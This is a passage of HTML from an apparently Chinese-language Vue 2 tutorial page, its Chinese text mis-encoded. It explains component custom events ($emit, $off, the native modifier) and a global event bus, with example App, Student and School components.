</li><li>ç»„ä»¶ä¸Šä¹Ÿå¯ä»¥ç»‘å®šåŸç”ŸDOMäº‹ä»¶ï¼Œéœ€è¦ä½¿ç”¨nativeä¿®é¥°ç¬¦  <code>@click.native=&quot;show&quot;</code>ä¸Šé¢ç»‘å®šè‡ªå®šä¹‰äº‹ä»¶ï¼Œå³ä½¿ç»‘å®šçš„æ˜¯åŸç”Ÿäº‹ä»¶ä¹Ÿä¼šè¢«è®¤ä¸ºæ˜¯è‡ªå®šä¹‰çš„ï¼Œéœ€è¦åŠ <strong>native</strong>ï¼ŒåŠ äº†åå°±å°†æ­¤äº‹ä»¶ç»™ç»„ä»¶çš„æ ¹å…ƒç´ </li><li>æ³¨æ„ï¼šé€šè¿‡<code>this.$refs.xxx.$on(&#39;äº‹ä»¶å&#39;,å›è°ƒå‡½æ•°)</code>ç»‘å®šè‡ªå®šä¹‰äº‹ä»¶æ—¶ï¼Œå›è°ƒå‡½æ•°è¦ä¹ˆé…ç½®åœ¨<strong>methods</strong>ä¸­ï¼Œè¦ä¹ˆç”¨ç®­å¤´å‡½æ•°ï¼Œå¦åˆ™ this æŒ‡å‘ä¼šå‡ºé—®é¢˜</li></ol><blockquote><p>å…·ä½“ä»£ç </p></blockquote><p>App.vue</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;&#123; msg &#125;&#125;ï¼Œå­¦ç”Ÿå§“åæ˜¯:&#123;&#123; studentName &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- é€šè¿‡çˆ¶ç»„ä»¶ç»™å­ç»„ä»¶ä¼ é€’å‡½æ•°ç±»å‹çš„propså®ç°å­ç»™çˆ¶ä¼ é€’æ•°æ® --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">School</span> <span class="hljs-attr">:getSchoolName</span>=<span class="hljs-string">&quot;getSchoolName&quot;</span>/&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- é€šè¿‡çˆ¶ç»„ä»¶ç»™å­ç»„ä»¶ç»‘å®šä¸€ä¸ªè‡ªå®šä¹‰äº‹ä»¶å®ç°å­ç»™çˆ¶ä¼ é€’æ•°æ®ï¼ˆç¬¬ä¸€ç§å†™æ³•ï¼Œä½¿ç”¨@æˆ–v-onï¼‰ --&gt;</span><br>    <span class="hljs-comment">&lt;!-- &lt;Student @atguigu=&quot;getStudentName&quot; @demo=&quot;m1&quot;/&gt; --&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- é€šè¿‡çˆ¶ç»„ä»¶ç»™å­ç»„ä»¶ç»‘å®šä¸€ä¸ªè‡ªå®šä¹‰äº‹ä»¶å®ç°å­ç»™çˆ¶ä¼ é€’æ•°æ®ï¼ˆç¬¬äºŒç§å†™æ³•ï¼Œä½¿ç”¨refï¼‰ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Student</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;student&quot;</span> @<span class="hljs-attr">click.native</span>=<span class="hljs-string">&quot;show&quot;</span>/&gt;</span> <span class="hljs-comment">&lt;!-- ğŸ”´native --&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/Student&#x27;</span></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">School</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/School&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">components</span>:&#123;<span class="hljs-title class_">School</span>,<span class="hljs-title class_">Student</span>&#125;,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">msg</span>:<span class="hljs-string">&#x27;ä½ å¥½å•Šï¼&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">studentName</span>:<span class="hljs-string">&#x27;&#x27;</span></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">getSchoolName</span>(<span class="hljs-params">name</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Appæ”¶åˆ°äº†å­¦æ ¡åï¼š&#x27;</span>,name)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-title function_">getStudentName</span>(<span class="hljs-params">name,...params</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Appæ”¶åˆ°äº†å­¦ç”Ÿåï¼š&#x27;</span>,name,params)</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">studentName</span> = name</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-title function_">m1</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;demoäº‹ä»¶è¢«è§¦å‘äº†ï¼&#x27;</span>)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-title function_">show</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">alert</span>(<span class="hljs-number">123</span>)</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">student</span>.$on(<span class="hljs-string">&#x27;atguigu&#x27;</span>,<span class="hljs-variable language_">this</span>.<span class="hljs-property">getStudentName</span>) <span class="hljs-comment">// ğŸ”´ç»‘å®šè‡ªå®šä¹‰äº‹ä»¶</span></span><br><span class="language-javascript">      <span class="hljs-comment">// this.$refs.student.$once(&#x27;atguigu&#x27;,this.getStudentName) // ç»‘å®šè‡ªå®šä¹‰äº‹ä»¶ï¼ˆä¸€æ¬¡æ€§ï¼‰</span></span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"><span class="hljs-selector-class">.app</span>&#123;<span class="hljs-attribute">background-color</span>: gray;<span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Student.vue</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;student&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦ç”Ÿå§“åï¼š&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦ç”Ÿæ€§åˆ«ï¼š&#123;&#123;sex&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å½“å‰æ±‚å’Œä¸ºï¼š&#123;&#123;number&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>ç‚¹æˆ‘number++<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sendStudentlName&quot;</span>&gt;</span>æŠŠå­¦ç”Ÿåç»™App<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;unbind&quot;</span>&gt;</span>è§£ç»‘atguiguäº‹ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;death&quot;</span>&gt;</span>é”€æ¯å½“å‰Studentç»„ä»¶çš„å®ä¾‹(vc)<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Student&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;å¼ ä¸‰&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;ç”·&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">number</span>:<span class="hljs-number">0</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-title function_">add</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;addå›è°ƒè¢«è°ƒç”¨äº†&#x27;</span>)</span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.<span class="hljs-property">number</span>++</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">sendStudentlName</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-comment">// è§¦å‘Studentç»„ä»¶å®ä¾‹èº«ä¸Šçš„atguiguäº‹ä»¶</span></span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.$emit(<span class="hljs-string">&#x27;atguigu&#x27;</span>,<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>,<span class="hljs-number">666</span>,<span class="hljs-number">888</span>,<span class="hljs-number">900</span>)</span><br><span class="language-javascript"><span class="hljs-comment">// this.$emit(&#x27;demo&#x27;)</span></span><br><span class="language-javascript"><span class="hljs-comment">// this.$emit(&#x27;click&#x27;)</span></span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">unbind</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// ğŸ”´è§£ç»‘</span></span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.$off(<span class="hljs-string">&#x27;atguigu&#x27;</span>) <span class="hljs-comment">//è§£ç»‘ä¸€ä¸ªè‡ªå®šä¹‰äº‹ä»¶</span></span><br><span class="language-javascript"><span class="hljs-comment">// this.$off([&#x27;atguigu&#x27;,&#x27;demo&#x27;]) //è§£ç»‘å¤šä¸ªè‡ªå®šä¹‰äº‹ä»¶</span></span><br><span class="language-javascript"><span class="hljs-comment">// this.$off() //è§£ç»‘æ‰€æœ‰çš„è‡ªå®šä¹‰äº‹ä»¶</span></span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">death</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// é”€æ¯äº†å½“å‰Studentç»„ä»¶çš„å®ä¾‹ï¼Œé”€æ¯åæ‰€æœ‰Studentå®ä¾‹çš„è‡ªå®šä¹‰äº‹ä»¶å…¨éƒ½ä¸å¥æ•ˆ</span></span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.$destroy()</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;less&quot;</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.student</span>&#123;<span class="hljs-attribute">background-color</span>: pink;<span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;<span class="hljs-attribute">margin-top</span>: <span class="hljs-number">30px</span>;&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>â€‹    </p><blockquote><p>è‹¥æƒ³è®©è‡ªå®šä¹‰äº‹ä»¶åªèƒ½è§¦å‘ä¸€æ¬¡ï¼Œå¯ä»¥ä½¿ç”¨<code>once</code>ä¿®é¥°ç¬¦ï¼Œæˆ–<code>$once</code>æ–¹æ³•ã€‚</p><p>è§¦å‘è‡ªå®šä¹‰äº‹ä»¶ï¼š<code>this.$emit(&#39;atguigu&#39;,æ•°æ®)</code></p><p>ä½¿ç”¨ <code>this.$emit()</code> å°±å¯ä»¥å­ç»„ä»¶å‘çˆ¶ç»„ä»¶ä¼ æ•°æ®</p></blockquote><p><strong>è§£ç»‘è‡ªå®šä¹‰äº‹ä»¶</strong><code>this.$off(&#39;atguigu&#39;)</code></p><blockquote><p>ä»£ç </p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">this</span>.$off(<span class="hljs-string">&#x27;atguigu&#x27;</span>) <span class="hljs-comment">//è§£ç»‘ä¸€ä¸ªè‡ªå®šä¹‰äº‹ä»¶</span><br><span class="hljs-comment">// this.$off([&#x27;atguigu&#x27;,&#x27;demo&#x27;]) //è§£ç»‘å¤šä¸ªè‡ªå®šä¹‰äº‹ä»¶</span><br><span class="hljs-comment">// this.$off() //è§£ç»‘æ‰€æœ‰çš„è‡ªå®šä¹‰äº‹ä»¶</span><br></code></pre></td></tr></table></figure><p><strong>ç»„ä»¶ä¸Šä¹Ÿå¯ä»¥ç»‘å®šåŸç”ŸDOMäº‹ä»¶ ï¼Œéœ€è¦ä½¿ç”¨<code>native</code>ä¿®é¥°ç¬¦ã€‚</strong></p><blockquote><p>ä»£ç </p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!-- é€šè¿‡çˆ¶ç»„ä»¶ç»™å­ç»„ä»¶ç»‘å®šä¸€ä¸ªè‡ªå®šä¹‰äº‹ä»¶å®ç°ï¼šå­ç»™çˆ¶ä¼ é€’æ•°æ®ï¼ˆç¬¬äºŒç§å†™æ³•ï¼Œä½¿ç”¨refï¼‰ --&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Student</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;student&quot;</span> @<span class="hljs-attr">click.native</span>=<span class="hljs-string">&quot;show&quot;</span>/&gt;</span></span><br></code></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼šé€šè¿‡<code>this.$refs.xxx.$on(&#39;atguigu&#39;,å›è°ƒ)</code>ç»‘å®šè‡ªå®šä¹‰äº‹ä»¶æ—¶ï¼Œå›è°ƒè¦ä¹ˆé…ç½®åœ¨methodsä¸­ï¼Œè¦ä¹ˆç”¨ç®­å¤´å‡½æ•°ï¼Œå¦åˆ™thisæŒ‡å‘ä¼šå‡ºé—®é¢˜ï¼</p></blockquote><h2 id="2-5-å…¨å±€äº‹ä»¶æ€»çº¿"><a href="#2-5-å…¨å±€äº‹ä»¶æ€»çº¿" class="headerlink" title="2.5 å…¨å±€äº‹ä»¶æ€»çº¿"></a>2.5 å…¨å±€äº‹ä»¶æ€»çº¿</h2><p>ä¸€ç§å¯ä»¥åœ¨ä»»æ„ç»„ä»¶é—´é€šä¿¡çš„æ–¹å¼ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒå¿…é¡»æ»¡è¶³ä»¥ä¸‹æ¡ä»¶</p><ol><li>æ‰€æœ‰çš„ç»„ä»¶å¯¹è±¡éƒ½å¿…é¡»èƒ½çœ‹è§ä»– </li><li>è¿™ä¸ªå¯¹è±¡å¿…é¡»èƒ½å¤Ÿä½¿ç”¨$on$emit$offæ–¹æ³•å»ç»‘å®šã€è§¦å‘å’Œè§£ç»‘äº‹ä»¶</li></ol><p><strong>ä½¿ç”¨æ­¥éª¤</strong></p><ol><li><p>å®šä¹‰å…¨å±€äº‹ä»¶æ€»çº¿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vue">new Vue(&#123;<br>   ...<br>   beforeCreate() &#123;<br>   Vue.prototype.$bus = this // å®‰è£…å…¨å±€äº‹ä»¶æ€»çº¿ï¼Œ$bus å°±æ˜¯å½“å‰åº”ç”¨çš„ vm<br>   &#125;,<br>    ...<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨äº‹ä»¶æ€»çº¿ï¼š</p><ol><li>æ¥æ”¶æ•°æ®ï¼šAç»„ä»¶æƒ³æ¥æ”¶æ•°æ®ï¼Œåˆ™åœ¨Aç»„ä»¶ä¸­ç»™$busç»‘å®šè‡ªå®šä¹‰äº‹ä»¶ï¼Œäº‹ä»¶çš„å›è°ƒç•™åœ¨Aç»„ä»¶è‡ªèº«ã€‚</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html">export default &#123;<br>    methods()&#123;<br>        demo(data)&#123;...&#125;<br>    &#125;<br>    ...<br>    mounted() &#123;<br>        this.$bus.$on(&#x27;xxx&#x27;,this.demo)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹2. æä¾›æ•°æ®ï¼š<code>this.$bus.$emit(&#39;xxx&#39;,data)</code> </p></li><li><p>æœ€å¥½åœ¨beforeDestroyé’©å­ä¸­ï¼Œç”¨$offå»è§£ç»‘å½“å‰ç»„ä»¶æ‰€ç”¨åˆ°çš„äº‹ä»¶ã€‚</p></li></ol><blockquote><p>ç¤ºä¾‹ä»£ç </p></blockquote><p>main.js</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vue">import Vue from &#x27;vue&#x27;<br>import App from &#x27;./App.vue&#x27;<br><br>Vue.config.productionTip = false<br><br>new Vue(&#123;<br>  el:&#x27;#app&#x27;,<br>  render: h =&gt; h(App),<br>  beforeCreate() &#123;<br>    Vue.prototype.$bus = this // å®‰è£…å…¨å±€äº‹ä»¶æ€»çº¿<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>App.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">School</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Student</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/Student&#x27;</span></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">School</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/School&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">components</span>:&#123; <span class="hljs-title class_">School</span>, <span class="hljs-title class_">Student</span> &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"><span class="hljs-selector-class">.app</span>&#123;<span class="hljs-attribute">background-color</span>: gray;<span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>School.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;school&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦æ ¡åç§°ï¼š&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦æ ¡åœ°å€ï¼š&#123;&#123; address &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;School&quot;</span>,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;å°šç¡…è°·&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">address</span>: <span class="hljs-string">&quot;åŒ—äº¬&quot;</span>,</span><br><span class="language-javascript">      &#125;;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;  <span class="hljs-comment">//ğŸ”´</span></span><br><span class="language-javascript">      <span class="hljs-comment">// console.log(&#x27;School&#x27;,this)</span></span><br><span class="language-javascript">      <span class="hljs-variable language_">this</span>.<span class="hljs-property">$bus</span>.$on(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;æˆ‘æ˜¯Schoolç»„ä»¶ï¼Œæ”¶åˆ°äº†æ•°æ®&quot;</span>, data);</span><br><span class="language-javascript">      &#125;);</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-title function_">beforeDestroy</span>(<span class="hljs-params"></span>) &#123;  <span class="hljs-comment">//ğŸ”´</span></span><br><span class="language-javascript">      <span class="hljs-variable language_">this</span>.<span class="hljs-property">$bus</span>.$off(<span class="hljs-string">&quot;hello&quot;</span>);</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">  &#125;;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"><span class="hljs-selector-class">.school</span> &#123;<span class="hljs-attribute">background-color</span>: skyblue;<span class="hljs-attribute">padding</span>: <span 